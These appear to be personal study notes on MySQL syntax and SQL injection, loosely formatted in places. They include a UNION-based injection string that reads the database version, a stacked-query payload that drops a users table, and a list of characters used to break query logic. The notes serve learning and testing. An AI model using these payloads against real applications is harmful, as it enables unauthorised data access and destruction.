*Table Manipulation *
```mysql
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value); 
```
```mysql
INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
```



```mysql
ALTER TABLE logins ADD newcolumn INT: 
```
```
ALTER TABLE logins MODIFY newerColumn DATE;

```



```mysql
UPDATE logins SET password = 'change_password' WHERE id > 1;
```
# Internal 
### ***Database Version***

```sql
SELECT @@version
```

```sql
SELECT POW(1,1)
```


```sql
SELECT SLEEP(5) 
```

### ***Table Selection***

```mysql
SELECT * FROM table_name; *

```
\
```mysql
SELECT * FROM logins ORDER BY password;
```

```mysql
SELECT * FROM logins ORDER BY password DESC, id ASC;

```


**Limiting Results 

```
SELECT * FROM logins LIMIT 2;
```
```
SELECT * FROM logins LIMIT 1, 2;
```

**Where Results **

```
SELECT * FROM table_name WHERE <condition>;
```

```
SELECT * FROM logins WHERE id > 1;
```

```
SELECT * FROM logins where username = 'admin'
```

**Like**

```
SELECT * FROM logins WHERE username LIKE 'admin%';
```


```
SELECT * FROM logins WHERE username like '___';
```


```
SELECT * FROM logins WHERE username != 'john' AND id > 1;
```

### Column Selection 

```
SELECT * from information_schema.columns

```

### Other Database Values 

```
UNION select 1, 

```

# Exploitation 
## Logic Suberversion 

### Comments 
- Comments can be added to prevent certain logic from being executed. Anything found after a ``--`` or `##` is not executed 
- Parentheses can also be used to ensure certain conditions are checked before others  
### Union Clause
- Union clauses combine results from SELECT statements 
- Data types from each column MUST be the same, and the number of columns in each table MUST also match 
`SELECT a, b FROM table1 UNION SELECT c, d FROM table2



```
SELECT * FROM ports UNION SELECT * FROM ships`

ports: table 
ships: another table 
```

**Determining Column Number **

- ORDER BY 
- UNION 
- The last successful column sorted determines what the number of columns are 

**Determining  Where To Place Injection **

```
cn' UNION select 1,@@version,3,4-- -
```



## Reading Files  

```mysql
DROP 

```


An SQL injection occurs when user-input is inputted into the SQL query string without properly sanitizing or filtering the input. The previous example showed how user-input can be used within an SQL query, and it did not use any form of input sanitization:

```sql
select * from logins where username like '%$searchInput'
```

```sql
'%1'; DROP TABLE users;'
```

```sql
select * from logins where username like '%1'; DROP TABLE users;'
```



# Types of Injections 
- In-band 
	- Union Based: Exact location must be specified

logic can be subverted by using various payloads like the following 

```shell
'

```

```shell
''
```

```shell
#

```

```shell
;

```

```shell
)

```
OR injections 
- can be used 
- AND gets evaluated by OR 
![[Pasted image 20260616200436.png]]
'1' = '1' is True 
password='something' is False 
The result of the AND is evaluated BEFORE the OR. So the answer would be false first then true.
